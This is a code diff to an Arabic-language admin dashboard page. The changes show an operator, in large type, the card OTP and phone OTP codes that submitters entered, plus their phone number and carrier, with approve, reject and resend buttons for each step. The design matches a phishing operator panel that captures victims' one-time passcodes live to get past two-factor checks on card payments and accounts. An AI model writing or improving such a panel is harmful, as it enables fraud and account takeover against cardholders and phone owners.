@@ -431,8 +431,11 @@ export default function DashboardPage() {
     const cardOtpStatus = getCardOtpStatus();
     const raw = selectedRequest?.raw;
 
+    // Get the OTP code from various possible field names
+    const otpCode = raw?._v5 || raw?.otpCode || "";
+
     // Only show this box when at step 5 OR if card OTP data exists
-    if (currentStep !== 5 && !raw?._v5 && !raw?.otpCode) {
+    if (currentStep !== 5 && !otpCode && !raw?.otpSubmittedAt) {
       return null;
     }
 
@@ -445,6 +448,14 @@ export default function DashboardPage() {
           </h3>
           <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>الخطوة 2</span>
         </div>
+        
+        {/* Show OTP code when submitted */}
+        {otpCode && (
+          <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12, textAlign: "center" }}>
+            <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
+            <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{otpCode}</p>
+          </div>
+        )}
         
         {/* Status message */}
         {cardOtpStatus === "approved" && (
@@ -463,16 +474,16 @@ export default function DashboardPage() {
           </div>
         )}
         
-        {/* Action buttons - show only when at this step */}
-        {(cardOtpStatus === "pending" || cardOtpStatus === "verifying" || !cardOtpStatus) && (currentStep === 5 || currentPage === "veri") && (
+        {/* Action buttons - show only when at this step and status is pending/verifying */}
+        {(cardOtpStatus === "pending" || cardOtpStatus === "verifying" || !cardOtpStatus) && (currentStep === 5 || currentPage === "veri") && otpCode && (
           <div style={{ display: "flex", gap: 8 }}>
             <button onClick={() => handleOtpAction("approved")} disabled={actionLoading === "otp"}
               style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700 }}>
-              ✅ موافق
+              {actionLoading === "otp" ? "جاري..." : "✅ موافق"}
             </button>
             <button onClick={() => handleOtpAction("rejected")} disabled={actionLoading === "otp"}
               style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700 }}>
-              ❌ مرفوض
+              {actionLoading === "otp" ? "جاري..." : "❌ مرفوض"}
             </button>
           </div>
         )}
@@ -527,10 +538,13 @@ export default function DashboardPage() {
     const phoneOtpStatus = getPhoneOtpStatus();
     const raw = selectedRequest?.raw;
 
-    // Only show this box when at step 7 OR if phone OTP data exists
+    // Only show this box when at step 7 OR if phone data exists
     if (currentStep !== 7 && !raw?.phoneNumber && !raw?.phoneOtpStatus) {
       return null;
     }
+
+    // Get phone OTP code if submitted
+    const phoneOtpCode = raw?.phoneOtp || "";
 
     return (
       <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
@@ -544,9 +558,19 @@ export default function DashboardPage() {
         
         {/* Phone number info */}
         {raw?.phoneNumber && (
-          <p style={{ margin: "0 0 12px", fontSize: "0.85rem", color: "#6b7280" }}>
-            رقم الهاتف: <strong dir="ltr">{raw.phoneNumber}</strong> - الشركة: {raw.phoneCarrier || "غير محدد"}
-          </p>
+          <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12 }}>
+            <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رقم الهاتف:</p>
+            <p style={{ margin: 0, fontSize: "1rem", fontWeight: 700, color: "#0c4a6e" }} dir="ltr">{raw.phoneNumber}</p>
+            <p style={{ margin: "4px 0 0", fontSize: "0.75rem", color: "#0369a1" }}>الشركة: {raw.phoneCarrier || "غير محدد"}</p>
+          </div>
+        )}
+        
+        {/* Show phone OTP code when submitted */}
+        {phoneOtpCode && (
+          <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", marginBottom: 12, textAlign: "center" }}>
+            <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق:</p>
+            <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{phoneOtpCode}</p>
+          </div>
         )}
         
         {/* Status message */}
@@ -566,16 +590,16 @@ export default function DashboardPage() {
           </div>
         )}
         
-        {/* Action buttons - show only when at this step */}
-        {(phoneOtpStatus === "pending" || phoneOtpStatus === "verifying" || !phoneOtpStatus) && currentStep === 7 && (
+        {/* Action buttons - show only when at this step and phone data exists */}
+        {(phoneOtpStatus === "pending" || phoneOtpStatus === "verifying" || !phoneOtpStatus) && currentStep === 7 && raw?.phoneNumber && (
           <div style={{ display: "flex", gap: 8 }}>
             <button onClick={() => handlePhoneAction("approved")} disabled={actionLoading === "phone"}
               style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700 }}>
-              ✅ موافق
+              {actionLoading === "phone" ? "جاري..." : "✅ موافق"}
             </button>
             <button onClick={() => handlePhoneAction("rejected")} disabled={actionLoading === "phone"}
               style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700 }}>
-              ❌ مرفوض
+              {actionLoading === "phone" ? "جاري..." : "❌ مرفوض"}
             </button>
             <button onClick={() => handlePhoneAction("resend")} disabled={actionLoading === "phone"}
               style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#f59e0b", color: "#fff", fontWeight: 700 }}>
